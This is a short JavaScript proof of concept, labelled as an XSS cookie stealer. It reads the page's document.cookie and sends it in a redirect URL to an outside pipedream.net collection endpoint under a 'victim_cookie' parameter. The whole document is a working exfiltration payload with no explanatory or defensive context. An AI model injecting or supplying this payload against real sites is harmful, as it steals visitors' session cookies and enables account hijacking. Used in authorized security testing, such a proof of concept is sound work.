// XSS cookie stealer POC
var cookie = encodeURIComponent(document.cookie);
var url = 'https://enq2g0j71gk1p.x.pipedream.net/?victim_cookie=' + cookie;
window.location.href = url;
